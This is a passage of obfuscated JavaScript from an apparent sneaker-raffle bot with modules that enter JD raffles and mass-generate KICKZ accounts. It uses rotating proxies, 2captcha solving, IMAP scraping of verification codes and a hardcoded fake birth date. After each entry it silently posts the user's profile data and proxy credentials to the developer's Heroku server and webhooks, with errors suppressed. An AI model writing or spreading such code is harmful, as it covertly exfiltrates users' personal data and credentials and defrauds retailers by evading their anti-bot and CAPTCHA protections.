                            let _0x3d128e = await _0x2c300e['$']('div[jsname=\x22OCpkoe\x22]');
                            if (_0x3d128e)
                                return await _0x3d128e['click'](), await _0x2c300e['waitForNavigation']({ 'waitUntil': 'networkidle2' }), _0xa446aa('New\x20Section'), _0x305aa7();
                        }
                        await _0x305aa7(), await _0x2c300e['click']('div[jsname=\x22M2UYVd\x22]');
                        try {
                            await _0x2c300e['waitForSelector']('.vHW8K');
                        } catch {
                            throw new Error('Could\x20not\x20send\x20Form,\x20check\x20all\x20fields!');
                        }
                        _0x1ab0d7(_0x1ec378[_0x1ba8a6], _0x32acf1), _0x57f94c = 'no';
                        var _0x53d66a = await _0x198507(_0x1ec378[_0x1ba8a6], _0x32acf1, 'dev', ![]), _0x4a0036 = await _0x198507(_0x1ec378[_0x1ba8a6], _0x32acf1, 'pub', ![]);
                        let _0x319aaf = _0x1ec378[_0x1ba8a6];
                        try {
                            prxdata = {
                                'username': _0x484f45['replace']('#', ''),
                                'module': _0x32acf1['name'],
                                'entrydata': JSON['stringify'](_0x319aaf),
                                'proxy': '' + _0x5491de[_0x1ba8a6]
                            };
                            var _0x443866 = JSON['stringify'](prxdata);
                            let _0xa3c899 = { 'headers': { 'content-type': 'application/json' } };
                            await _0x20b5bc['post']('https://jraffles.herokuapp.com/success', _0x443866, _0xa3c899);
                        } catch (_0x55dba8) {
                        }
                        const _0x671cbd = {
                            'succesDEVMSG': { 'embeds': [_0x53d66a] },
                            'succesPUBMSG': { 'embeds': [_0x4a0036] }
                        };
                        try {
                            _0x2ab3b9['webhook'] != undefined && _0x2ab3b9['webhook'] != '' && await _0x56185b(_0x2ab3b9['webhook'], _0x671cbd['succesDEVMSG']), await _0x63aa6a(0xc8), await _0x56185b(_0x2b8095, _0x671cbd['succesDEVMSG']), await _0x63aa6a(0xc8), await _0x56185b(_0x595b38, _0x671cbd['succesPUBMSG']);
                        } catch (_0xf204b) {
                            console['log'](_0x49a6ed['yellow'](_0x2bc944() + '\x20[' + _0x388222[taskModule]['name'] + ']\x20Task\x20' + (_0x1ba8a6 + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0xf204b));
                        }
                        console['log'](_0x49a6ed['green'](_0x2bc944() + '\x20[' + _0x32acf1['name'] + ']\x20Task\x20' + (_0x1ba8a6 + 0x1) + '\x20:\x20Raffle\x20Entered!')), (_0x53a156 != 0x0 || _0xf70697 != 0x0 && !_0x43687d) && (_0xf23186['push'](_0x4d4eee), _0x25647b['writeFileSync']('forms/templates.json', JSON['stringify'](_0xf23186, null, 0x2), 'utf-8'));
                    } catch (_0x3bff44) {
                        console['log'](_0x49a6ed['red'](_0x2bc944() + '\x20[' + _0x32acf1['name'] + ']\x20Task\x20' + (_0x1ba8a6 + 0x1) + '\x20:\x20' + _0x3bff44)), _0x188b5f = '' + _0x3bff44;
                        var _0x3d92d9 = await _0x198507(_0x1ec378[_0x1ba8a6], _0x32acf1, 'dev', !![], _0x188b5f);
                        let _0x388b3d = {};
                        _0x388b3d['errorDEV'] = { 'embeds': [_0x3d92d9] }, _0x2ab3b9['webhook'] != undefined && _0x2ab3b9['webhook'] != '' && await _0x56185b(_0x2ab3b9['webhook'], _0x388b3d['errorDEV']), await _0x56185b(_0x3c02fa, _0x388b3d['errorDEV']), _0x57f94c = 'yes';
                    } finally {
                        _0x183781 && _0x183781['close']();
                        if (_0x57f94c == 'yes' && _0x129689 != 0x5) {
                            console['log'](_0x49a6ed['red'](_0x2bc944() + '\x20[' + _0x32acf1['name'] + ']\x20Task\x20' + (_0x1ba8a6 + 0x1) + '\x20:\x20Retrying\x20(' + (_0x129689 + 0x1) + '\x20/\x205)')), _0x1ba8a6--, _0x129689++;
                            continue;
                        }
                        if (_0x57f94c == 'yes' && _0x129689 == 0x5) {
                            _0x129689 = 0x0, _0x57f94c = 'no';
                            continue;
                        }
                        _0xa446aa('Waiting\x20for\x20' + _0x2ab3b9['delay'] + '\x20ms'), await _0x63aa6a(_0x2ab3b9['delay']);
                    }
                }
            }
        }]
    },
    {
        'name': 'JD',
        'modules': [{
            'name': 'JD\x20Raffle\x20Entries',
            'store': 'JD',
            'logo': 'https://upload.wikimedia.org/wikipedia/en/thumb/d/d8/JD_Sports_logo.svg/2048px-JD_Sports_logo.svg.png',
            'function': async function (_0x4a06f0, _0x42698c, _0x5aabf2) {
                var _0x7c3c63 = ![], _0x1e77b8 = ![];
                if (_0x2ab3b9['captchaKey'] == '' || _0x2ab3b9['captchaKey'] == undefined)
                    return console['log'](_0x49a6ed['yellow']('No\x202Captcha\x20key\x20found\x20in\x20settings.json')), console['log']('Returning\x20to\x20Menu'), menu();
                _0x555941['use'](_0x13dc37()), _0x555941['use'](_0x243285({
                    'provider': {
                        'id': '2captcha',
                        'token': '' + _0x2ab3b9['captchaKey']
                    },
                    'visualFeedback': !![]
                }));
                for (var _0x9c8cb7 = 0x0; _0x9c8cb7 < _0x42698c['length']; _0x9c8cb7++) {
                    if (_0x545ab0 != 'yes')
                        var _0x545ab0 = '', _0x28e8ea = 0x0;
                    var _0x1060b2, _0x249fe2 = [{
                        'type': 'rich',
                        'title': 'Succesful\x20JD\x20entry',
                        'description': '',
                        'color': 0xc0d6d6,
                        'fields': [
                            {
                                'name': 'Product',
                                'value': '' + _0x42698c[_0x9c8cb7]['Url']
                            },
                            {
                                'name': 'Size',
                                'value': '' + _0x42698c[_0x9c8cb7]['Size']
                            },
                            {
                                'name': 'User',
                                'value': '' + _0x484f45
                            },
                            {
                                'name': 'Delay',
                                'value': '' + _0x2ab3b9['delay']
                            },
                            {
                                'name': 'Version',
                                'value': '' + _0xb0ce0a
                            }
                        ]
                    }];
                    const _0x16d84e = { 'embeds': _0x249fe2 };
                    _0x9474bc(_0x4a06f0['name'] + '\x20Task\x20' + (_0x9c8cb7 + 0x1) + '\x20/\x20' + _0x42698c['length'] + '\x20||\x20File:\x20' + _0x52153a + '\x20Proxies:\x20' + _0x2a2376);
                    try {
                        await _0x5921e0(_0x42698c, _0x9c8cb7);
                    } catch {
                        _0x545ab0 = 'no';
                        throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                    }
                    var _0x4a4a24 = await _0x198507(_0x42698c[_0x9c8cb7], _0x4a06f0, 'dev', ![]), _0x12e8f1 = await _0x198507(_0x42698c[_0x9c8cb7], _0x4a06f0, 'pub', ![]);
                    const _0x4a9f5c = {
                        'succesDEVMSG': { 'embeds': [_0x4a4a24] },
                        'succesPUBMSG': { 'embeds': [_0x12e8f1] }
                    };
                    if (_0x2ab3b9['webhook'] != undefined && _0x2ab3b9['webhook'] != '')
                        try {
                            await _0x56185b(_0x2ab3b9['webhook'], _0x4a9f5c['succesDEVMSG']);
                        } catch {
                        }
                    await _0x63aa6a(0xc8), await _0x56185b(_0x2b8095, _0x4a9f5c['succesDEVMSG']), await _0x63aa6a(0xc8);
                    try {
                        await _0x56185b(_0x595b38, _0x4a9f5c['succesPUBMSG']);
                    } catch {
                    }
                    if (_0x42698c[_0x9c8cb7]['Email'] == '' || _0x42698c[_0x9c8cb7]['Url'] == '' || _0x42698c[_0x9c8cb7]['FirstName'] == '' || _0x42698c[_0x9c8cb7]['LastName'] == '') {
                        console['log'](_0x2bc944() + '\x20[' + _0x388222[taskModule]['name'] + ']\x20Task\x20' + (_0x9c8cb7 + 0x1) + '\x20:\x20Invalid\x20CSV');
                        continue;
                    }
                    if (_0x2ab3b9['useRandomProxy'] = ![])
                        var _0x3b2d49 = _0x5aabf2[_0x9c8cb7]['split'](':');
                    else
                        var _0x18a63a = Math['round'](Math['random']() * (_0x5aabf2['length'] - 0x1)), _0x3b2d49 = _0x5aabf2[_0x18a63a]['split'](':');
                    var _0x4d854f;
                    try {
                        _0x4d854f = await _0x555941['launch']({
                            'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                            'headless': !![],
                            'args': [
                                '--proxy-server=' + _0x3b2d49[0x0] + ':' + _0x3b2d49[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                    } catch {
                        _0x4d854f = await _0x555941['launch']({
                            'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                            'headless': !![],
                            'args': [
                                '--proxy-server=' + _0x3b2d49[0x0] + ':' + _0x3b2d49[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                    }
                    try {
                        const _0x5a9092 = await _0x4d854f['newPage']();
                        await _0x5a9092['authenticate']({
                            'username': '' + _0x3b2d49[0x2],
                            'password': '' + _0x3b2d49[0x3]
                        }), console['log'](_0x2bc944() + '\x20[' + _0x4a06f0['name'] + ']\x20Task\x20' + (_0x9c8cb7 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x5a9092['setRequestInterception'](!![]), _0x5a9092['on']('request', _0x31eb44 => {
                            _0x31eb44['resourceType']() === 'image' || _0x31eb44['resourceType']() === 'font' || _0x31eb44['resourceType']() === 'media' ? _0x31eb44['abort']() : _0x31eb44['continue']();
                        });
                        try {
                            await _0x5a9092['goto']('' + _0x42698c[_0x9c8cb7]['Url'], {
                                'waitUntil': 'networkidle2',
                                'timeout': 0xea60
                            });
                        } catch {
                            throw new Error('Connection\x20Error');
                        }
                        try {
                            await _0x5a9092['waitForSelector']('#comp_firstname', { 'timeout': 0x7530 });
                        } catch {
                            throw new Error('Not\x20an\x20Active\x20Raffle');
                        }
                        console['log'](_0x2bc944() + '\x20[' + _0x4a06f0['name'] + ']\x20Task\x20' + (_0x9c8cb7 + 0x1) + '\x20:\x20Filling\x20Information'), await _0x5a9092['type']('#comp_firstname', '' + _0x42698c[_0x9c8cb7]['FirstName']), await _0x5a9092['waitForSelector']('#comp_lastname'), await _0x5a9092['type']('#comp_lastname', '' + _0x42698c[_0x9c8cb7]['LastName']), await _0x5a9092['waitForSelector']('#comp_email'), await _0x5a9092['type']('#comp_email', '' + _0x42698c[_0x9c8cb7]['Email']), await _0x5a9092['waitForSelector']('#comp_paypalemail'), await _0x5a9092['type']('#comp_paypalemail', '' + _0x42698c[_0x9c8cb7]['Email']), await _0x5a9092['waitForSelector']('#comp_mobile_end'), await _0x5a9092['type']('#comp_mobile_end', '' + _0x42698c[_0x9c8cb7]['Phone']), await _0x5a9092['waitForSelector']('#comp_dob'), await _0x5a9092['type']('#comp_dob', '08/09/1992'), console['log'](_0x2bc944() + '\x20[' + _0x4a06f0['name'] + ']\x20Task\x20' + (_0x9c8cb7 + 0x1) + '\x20:\x20Choosing\x20Size');
                        if (_0x42698c[_0x9c8cb7]['Size'] == 'RANDOM') {
                            const _0x3f3f69 = await _0x5a9092['$$eval']('select[id=\x22shoesize\x22]\x20>\x20option', _0x456783 => {
                                return _0x456783['map'](_0x5d56b1 => _0x5d56b1['value']);
                            });
                            var _0xb22bf6 = Math['round'](Math['random']() * (_0x3f3f69['length'] - 0x2));
                            await _0x5a9092['select']('#shoesize', _0x3f3f69[_0xb22bf6 + 0x1]), await _0x63aa6a(0x3e8);
                        } else {
                            const _0x5e8fbe = await _0x5a9092['$$eval']('select[id=\x22shoesize\x22]\x20>\x20option', _0x3af8e0 => {
                                return _0x3af8e0['map'](_0x25e456 => _0x25e456['innerText']);
                            }), _0x50dd2f = await _0x5a9092['$$eval']('select[id=\x22shoesize\x22]\x20>\x20option', _0x2772d4 => {
                                return _0x2772d4['map'](_0x1483ca => _0x1483ca['value']);
                            });
                            var _0x1e89e9 = _0x42698c[_0x9c8cb7]['Size'];
                            for (var _0x25c2fe = 0x1; _0x25c2fe < _0x50dd2f['length']; _0x25c2fe++) {
                                var _0x42348c = _0x5e8fbe[_0x25c2fe]['split']('\x20')[0x0];
                                if (_0x42348c == _0x1e89e9) {
                                    await _0x5a9092['select']('#shoesize', _0x50dd2f[_0x25c2fe]);
                                    break;
                                } else {
                                    if (_0x25c2fe + 0x1 == _0x50dd2f['length'])
                                        throw new Error('Size\x20Not\x20Found..');
                                }
                            }
                        }
                        await _0x5a9092['waitForSelector']('#comp_address1'), await _0x5a9092['type']('#comp_address1', _0x42698c[_0x9c8cb7]['Address1'] + '\x20' + _0x42698c[_0x9c8cb7]['HouseNumber']), await _0x5a9092['waitForSelector']('#comp_address2'), await _0x5a9092['type']('#comp_address2', '' + _0x42698c[_0x9c8cb7]['Address2']), await _0x5a9092['waitForSelector']('#comp_address2'), await _0x5a9092['type']('#comp_address3', '' + _0x42698c[_0x9c8cb7]['City']), await _0x5a9092['waitForSelector']('#comp_postcode'), await _0x5a9092['type']('#comp_postcode', '' + _0x42698c[_0x9c8cb7]['Zip']), console['log'](_0x2bc944() + '\x20[' + _0x4a06f0['name'] + ']\x20Task\x20' + (_0x9c8cb7 + 0x1) + '\x20:\x20Sending\x20Entry'), await _0x63aa6a(0x4b0), await _0x5a9092['click']('label#emailhold'), await _0x63aa6a(0x5dc), await _0x5a9092['click']('#preauth_tandc_email\x20>\x20label'), await _0x63aa6a(0x5dc), await _0x5a9092['click']('#submit');
                        try {
                            await _0x5a9092['waitForSelector']('#paymentWrap');
                        } catch {
                            throw new Error('Could\x20not\x20find\x20Payment');
                        }
                        console['log'](_0x2bc944() + '\x20[' + _0x4a06f0['name'] + ']\x20Task\x20' + (_0x9c8cb7 + 0x1) + '\x20:\x20' + _0x49a6ed['blue']('Awaiting\x20Paypal\x20Payment')), _0x4d854f['on']('targetcreated', async _0x3cb019 => {
                            if (_0x3cb019['type']() === 'page') {
                                const _0x589a96 = await _0x3cb019['page']();
                                async function _0x538a32() {
                                    try {
                                        await _0x5a9092['waitForSelector']('#error_message', { 'timeout': 0x493e0 }), _0x1e77b8 = !![];
                                        return;
                                    } catch {
                                    }
                                }
                                async function _0x38f85e() {
                                    try {
                                        await _0x5a9092['waitForSelector']('#successMessage', { 'timeout': 0x493e0 }), _0x7c3c63 = !![];
                                        return;
                                    } catch {
                                    }
                                }
                                _0x38f85e(), _0x538a32(), await _0x63aa6a(0x493e0);
                            }
                        });
                        async function _0xee3800() {
                            for (let _0x13b8a7 = 0x0; _0x13b8a7 < 0x12c; _0x13b8a7++) {
                                if (_0x7c3c63 == !![]) {
                                    _0x545ab0 = 'no', _0x1ab0d7(_0x42698c[_0x9c8cb7], _0x4a06f0), console['log'](_0x49a6ed['green'](_0x2bc944() + '\x20[' + _0x4a06f0['name'] + ']\x20Task\x20' + (_0x9c8cb7 + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                                    if (_0x2ab3b9['webhook'] != undefined && _0x2ab3b9['webhook'] != '')
                                        try {
                                            await _0x56185b(_0x2ab3b9['webhook'], _0x4a9f5c['succesDEVMSG']);
                                        } catch {
                                        }
                                    await _0x63aa6a(0xc8), await _0x56185b(_0x2b8095, _0x4a9f5c['succesDEVMSG']), await _0x63aa6a(0xc8);
                                    try {
                                        await _0x56185b(_0x595b38, _0x4a9f5c['succesPUBMSG']);
                                    } catch {
                                    }
                                    return;
                                } else {
                                    if (_0x1e77b8)
                                        throw new Error('Paypal\x20Error:\x20Target\x20closed');
                                    else
                                        await _0x63aa6a(0x3e8);
                                }
                            }
                            throw new Error('Paypal\x20Error');
                        }
                        await _0x63aa6a(0xbb8), await _0x5a9092['click']('.zoid-outlet'), await _0x63aa6a(0x7d0), await _0xee3800();
                    } catch (_0x85e4b6) {
                        console['log'](_0x49a6ed['red'](_0x2bc944() + '\x20[' + _0x4a06f0['name'] + ']\x20Task\x20' + (_0x9c8cb7 + 0x1) + '\x20:\x20' + _0x85e4b6)), _0x1060b2 = '' + _0x85e4b6;
                        var _0x30d0c3 = await _0x198507(_0x42698c[_0x9c8cb7], _0x4a06f0, 'dev', !![], _0x1060b2);
                        _0x4a9f5c['errorDEV'] = { 'embeds': [_0x30d0c3] }, _0x2ab3b9['webhook'] != undefined && _0x2ab3b9['webhook'] != '' && await _0x56185b(_0x2ab3b9['webhook'], _0x4a9f5c['errorDEV']), await _0x56185b(_0x3c02fa, _0x4a9f5c['errorDEV']);
                    } finally {
                        _0x4d854f && _0x4d854f['close']();
                        if (_0x545ab0 == 'yes' && _0x28e8ea != 0x5 && _0x1060b2 != 'Size\x20Not\x20Found') {
                            console['log'](_0x49a6ed['red'](_0x2bc944() + '\x20[' + _0x4a06f0['name'] + ']\x20Task\x20' + (_0x9c8cb7 + 0x1) + '\x20:\x20Retrying\x20(' + _0x28e8ea + '\x20/\x205)')), _0x9c8cb7 = _0x9c8cb7 - 0x1, _0x28e8ea = _0x28e8ea + 0x1;
                            continue;
                        }
                        _0x545ab0 == 'yes' && _0x28e8ea >= 0x5 && (_0x11ea8b(afew[_0x9c8cb7], _0x4a06f0), _0x545ab0 = 'no', _0x28e8ea = 0x0), console['log']('Waiting\x20for\x20' + _0x2ab3b9['delay'] + '\x20ms'), await _0x63aa6a(_0x2ab3b9['delay']);
                    }
                }
            }
        }]
    },
    {
        'name': 'KICKZ',
        'modules': [
            {
                'name': 'KICKZ\x20Account\x20Generator',
                'store': 'KICKZ',
                'logo': 'https://scontent-ams2-1.cdninstagram.com/v/t51.2885-19/240479500_928777121004310_8721482303708952556_n.jpg?stp=dst-jpg_s320x320&_nc_ht=scontent-ams2-1.cdninstagram.com&_nc_cat=1&_nc_ohc=9H1DnW3bwMAAX-W7Mo2&edm=AOQ1c0wBAAAA&ccb=7-5&oh=00_AfDjR8EqgPUyl8iQgx56K_94mx_vSIRsFkQbyEq02-zAUQ&oe=63E0E147&_nc_sid=8fd12b',
                'function': async function (_0x1d2b8f, _0x1741f8, _0x557151) {
                    _0x555941['use'](_0x13dc37()), _0x555941['use'](_0x243285({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x2ab3b9['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x3dc8ad = 0x0; _0x3dc8ad < _0x1741f8['length']; _0x3dc8ad++) {
                        const _0x5ef63f = 'https://www.kickz.com/login';
                        if (_0x46dc7b != 'yes')
                            var _0x46dc7b = '', _0x27ae25 = 0x0;
                        _0x9474bc(_0x1d2b8f['name'] + '\x20Task\x20' + (_0x3dc8ad + 0x1) + '\x20/\x20' + _0x1741f8['length'] + '\x20||\x20File:\x20' + _0x52153a + '\x20Proxies:\x20' + _0x2a2376);
                        try {
                            await _0x5921e0(_0x1741f8, _0x3dc8ad);
                        } catch {
                            _0x46dc7b = 'no';
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        var _0x597988 = [{
                            'type': 'rich',
                            'title': 'Succesful\x20Kickz\x20Account\x20Generated',
                            'description': '',
                            'color': 0xc0d6d6,
                            'fields': [
                                {
                                    'name': 'User',
                                    'value': '' + _0x484f45
                                },
                                {
                                    'name': 'Delay',
                                    'value': '' + _0x2ab3b9['delay']
                                },
                                {
                                    'name': 'Version',
                                    'value': '' + _0xb0ce0a
                                }
                            ]
                        }];
                        const _0x52885b = { 'embeds': _0x597988 };
                        var _0x305022 = await _0x198507(_0x1741f8[_0x3dc8ad], _0x1d2b8f, 'acc', ![]);
                        const _0x489f8f = { 'succesDEVMSG': { 'embeds': [_0x305022] } };
                        if (_0x1741f8[_0x3dc8ad]['Email'] == '' || _0x1741f8[_0x3dc8ad]['FirstName'] == '' || _0x1741f8[_0x3dc8ad]['LastName'] == '') {
                            console['log'](_0x2bc944() + '\x20[' + _0x1d2b8f['name'] + ']\x20Task\x20' + (_0x3dc8ad + 0x1) + '\x20:\x20Invalid\x20CSV');
                            continue;
                        }
                        _0x1741f8[_0x3dc8ad]['Password'] == '' && (_0x1741f8[_0x3dc8ad]['Password'] = 'JRaffles23!');
                        if (_0x2ab3b9['useRandomProxy'] = ![])
                            var _0x1d29ce = _0x557151[_0x3dc8ad]['split'](':');
                        else
                            var _0x3a3a9d = Math['round'](Math['random']() * (_0x557151['length'] - 0x1)), _0x1d29ce = _0x557151[_0x3a3a9d]['split'](':');
                        var _0x3cf523;
                        try {
                            _0x3cf523 = await _0x555941['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x1d29ce[0x0] + ':' + _0x1d29ce[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x3cf523 = await _0x555941['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x1d29ce[0x0] + ':' + _0x1d29ce[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x19b0d2 = await _0x3cf523['newPage']();
                            await _0x19b0d2['authenticate']({
                                'username': '' + _0x1d29ce[0x2],
                                'password': '' + _0x1d29ce[0x3]
                            }), console['log'](_0x2bc944() + '\x20[' + _0x1d2b8f['name'] + ']\x20Task\x20' + (_0x3dc8ad + 0x1) + '\x20:\x20Getting\x20Session'), await _0x19b0d2['setRequestInterception'](!![]), _0x19b0d2['on']('request', _0x1c7087 => {
                                _0x1c7087['resourceType']() === 'image' || _0x1c7087['resourceType']() === 'font' || _0x1c7087['resourceType']() === 'media' ? _0x1c7087['abort']() : _0x1c7087['continue']();
                            }), await _0x19b0d2['goto'](_0x5ef63f), await _0x63aa6a(0xbb8), console['log'](_0x2bc944() + '\x20[' + _0x1d2b8f['name'] + ']\x20Task\x20' + (_0x3dc8ad + 0x1) + '\x20:\x20Starting\x20Registration'), await _0x19b0d2['waitForSelector']('#consent-dialog\x20>\x20section\x20>\x20button'), await _0x19b0d2['click']('#consent-dialog\x20>\x20section\x20>\x20button'), await _0x19b0d2['waitForSelector']('#button-register'), await _0x63aa6a(0x7d0), await _0x19b0d2['evaluate'](() => {
                                const _0x2a6795 = document['querySelector']('#button-register');
                                _0x2a6795['click']();
                            }), console['log'](_0x2bc944() + '\x20[' + _0x1d2b8f['name'] + ']\x20Task\x20' + (_0x3dc8ad + 0x1) + '\x20:\x20Setting\x20Credentials'), await _0x63aa6a(0x1388), await _0x19b0d2['waitForSelector']('#customer_salutation'), await _0x19b0d2['select']('#customer_salutation', 'mr'), await _0x63aa6a(0x7d0), await _0x19b0d2['waitForSelector']('#customer_firstname'), await _0x19b0d2['type']('#customer_firstname', '' + _0x1741f8[_0x3dc8ad]['FirstName']), await _0x63aa6a(0x352), await _0x19b0d2['waitForSelector']('#customer_lastname'), await _0x19b0d2['type']('#customer_lastname', '' + _0x1741f8[_0x3dc8ad]['LastName']), await _0x63aa6a(0x352), await _0x19b0d2['type']('#email-input', '' + _0x1741f8[_0x3dc8ad]['Email']), await _0x63aa6a(0x352), await _0x19b0d2['type']('#email-confirm-input', '' + _0x1741f8[_0x3dc8ad]['Email']), await _0x63aa6a(0x352), await _0x19b0d2['type']('#register-password', '' + _0x1741f8[_0x3dc8ad]['Password']), await _0x63aa6a(0x352), await _0x19b0d2['type']('#password-confirm', '' + _0x1741f8[_0x3dc8ad]['Password']), await _0x63aa6a(0x352), console['log'](_0x2bc944() + '\x20[' + _0x1d2b8f['name'] + ']\x20Task\x20' + (_0x3dc8ad + 0x1) + '\x20:\x20Sending\x20Credentials'), await _0x19b0d2['click']('#consent'), await _0x63aa6a(0x1f4);
                            const _0x2e80df = await _0x19b0d2['$']('div.inputErrorMsg.b-form_section-message');
                            if (_0x2e80df) {
                                console['log'](_0x49a6ed['red'](_0x2bc944() + '\x20[' + _0x1d2b8f['name'] + ']\x20Task\x20' + (_0x3dc8ad + 0x1) + '\x20:\x20Your\x20password\x20must\x20contain\x20at\x20least\x20one\x20uppercase\x20&\x20one\x20lowercase\x20letter,\x20one\x20number\x20and\x20one\x20special\x20character.'));
                                continue;
                            }
                            await _0x19b0d2['click']('#buttonRegister');
                            try {
                                await _0x19b0d2['waitForSelector']('#verificationCode');
                            } catch {
                                throw new Error('Account\x20already\x20registered');
                            }
                            console['log'](_0x2bc944() + '\x20[' + _0x1d2b8f['name'] + ']\x20Task\x20' + (_0x3dc8ad + 0x1) + '\x20:\x20A\x20verification\x20code\x20has\x20been\x20sent\x20to\x20' + _0x1741f8[_0x3dc8ad]['Email']), await _0x63aa6a(0x4b0);
                            async function _0xddbb7d() {
                                var _0x35955c, _0x1abaeb = ![];
                                for (var _0x4e3a8e = 0x0; _0x4e3a8e < 0x18; _0x4e3a8e++) {
                                    async function _0x78d2e3() {
                                        var _0x29a573 = new _0x117139({
                                            'user': _0x2ab3b9['masterMail'],
                                            'password': _0x2ab3b9['masterPassword'],
                                            'host': 'imap.gmail.com',
                                            'port': 0x3e1,
                                            'tls': !![],
                                            'autotls': 'always'
                                        });
                                        function _0x5125ff(_0x297372) {
                                            _0x29a573['openBox']('INBOX', ![], _0x297372);
                                        }
                                        _0x29a573['once']('ready', function () {
                                            console['log'](_0x2bc944() + '\x20[' + _0x1d2b8f['name'] + ']\x20Task\x20' + (_0x3dc8ad + 0x1) + '\x20:\x20Opened\x20Mailbox'), _0x5125ff(function (_0x31a9df, _0x5f0af9) {
                                                console['log'](_0x2bc944() + '\x20[' + _0x1d2b8f['name'] + ']\x20Task\x20' + (_0x3dc8ad + 0x1) + '\x20:\x20Looking\x20for\x20verification\x20mail');
                                                if (_0x31a9df)
                                                    throw _0x31a9df;
                                                _0x29a573['seq']['search']([
                                                    'UNSEEN',
                                                    [
                                                        'FROM',
                                                        'verification@kickz.com'
                                                    ]
                                                ], function (_0x48073d, _0x47de03) {
                                                    if (!_0x47de03 || !_0x47de03['length'])
                                                        console['log'](_0x2bc944() + '\x20[' + _0x1d2b8f['name'] + ']\x20No\x20mail\x20found,\x20retrying\x20in\x205\x20seconds'), _0x29a573['end']();
                                                    else {
                                                        var _0x54d91f = _0x29a573['seq']['fetch'](_0x47de03, {
                                                            'bodies': '',
                                                            'markSeen': !![]
                                                        });
                                                        _0x54d91f['on']('message', function (_0x381986, _0x52877e) {
                                                            var _0x27436e = '(#' + _0x52877e + ')\x20';
                                                            _0x381986['on']('body', function (_0x54e3dc, _0x4aefb2) {
                                                                _0x414931(_0x54e3dc, (_0x1027be, _0x57138c) => {
                                                                    if (_0x57138c['subject'] == 'Kickz\x20Account\x20Verification\x20Code') {
                                                                        var _0x19503c = _0x57138c['html']['split']('<div\x20style=\x22display:block;font-family:Arial,sans-serif;font-size:\x2030px;font-weight:\x20600;line-height:24px;color:#333333\x22>'), _0x137e13 = _0x19503c[0x1]['split']('<')[0x0];
                                                                        _0x35955c = _0x137e13;
                                                                    }
                                                                });
                                                            }), _0x381986['once']('end', function () {
                                                            });
                                                        }), _0x54d91f['once']('error', function (_0x264bea) {
                                                            console['log']('No\x20mail\x20found,\x20retrying\x20in\x205\x20seconds..');
                                                        }), _0x54d91f['once']('end', function () {
                                                            _0x29a573['end']();
                                                        });
                                                    }
                                                });
                                            });
                                        }), _0x29a573['once']('error', function (_0x2c3254) {
                                            console['log'](_0x49a6ed['red'](_0x2c3254['message'])), console['log']('Read\x20the\x20guide\x20on\x20how\x20to\x20setup\x20your\x20mailbox'), _0x1abaeb = !![];
                                        }), _0x29a573['once']('end', async function () {
                                        }), _0x29a573['connect']();
                                    }
                                    _0x78d2e3(), await _0x63aa6a(0x1388);
                                    if (_0x35955c)
                                        return _0x35955c;
                                    if (_0x1abaeb)
                                        throw new Error('Error\x20connecting\x20to\x20imap');
                                    if (_0x4e3a8e == 0x18)
                                        throw new Error('Mail\x20not\x20found');
                                }
                            }
                            ;
                            code = await _0xddbb7d(), _0x63aa6a(0x320), console['log'](_0x2bc944() + '\x20[' + _0x1d2b8f['name'] + ']\x20Task\x20' + (_0x3dc8ad + 0x1) + '\x20:\x20Verifying..'), await _0x19b0d2['type']('#verificationCode', code), await _0x63aa6a(0x1f4), await _0x19b0d2['click']('#buttonVerify'), await _0x63aa6a(0x190), await _0x19b0d2['click']('#buttonVerify'), await _0x63aa6a(0x3e8);
                            try {
                                await _0x19b0d2['waitForSelector']('div.b-user_greeting'), _0x46dc7b = 'no', console['log'](_0x49a6ed['green'](_0x2bc944() + '\x20[' + _0x1d2b8f['name'] + ']\x20Task\x20' + (_0x3dc8ad + 0x1) + '\x20:\x20Account\x20' + _0x1741f8[_0x3dc8ad]['Email'] + '\x20Generated\x20&\x20Verified!')), _0x25647b['appendFileSync']('../accounts/kickz-verified.csv', '\x0a' + _0x1741f8[_0x3dc8ad]['Email'] + ',' + _0x1741f8[_0x3dc8ad]['Password'] + ','), console['log'](_0x2bc944() + '\x20[' + _0x1d2b8f['name'] + ']\x20Task\x20' + (_0x3dc8ad + 0x1) + '\x20:\x20Account\x20' + _0x1741f8[_0x3dc8ad]['Email'] + '\x20Saved\x20in\x20\x27accounts/kickz-verified.csv\x27');
                                try {
                                    _0x2ab3b9['webhook'] != undefined && _0x2ab3b9['webhook'] != '' && await _0x56185b(_0x2ab3b9['webhook'], _0x489f8f['succesDEVMSG']);
                                } catch {
                                }
                                await _0x56185b(_0x46e741, _0x489f8f['succesDEVMSG']);
                            } catch {
                                _0x46dc7b = 'no', console['log'](_0x49a6ed['red'](_0x2bc944() + '\x20[' + _0x1d2b8f['name'] + ']\x20Task\x20' + (_0x3dc8ad + 0x1) + '\x20:\x20Verification\x20failed')), console['log'](_0x49a6ed['red'](_0x2bc944() + '\x20[' + _0x1d2b8f['name'] + ']\x20Task\x20' + (_0x3dc8ad + 0x1) + '\x20:\x20Account\x20saved\x20in\x20\x27accounts/kickz-unverified.csv\x27'));
                            }
                        } catch (_0x3cdf20) {
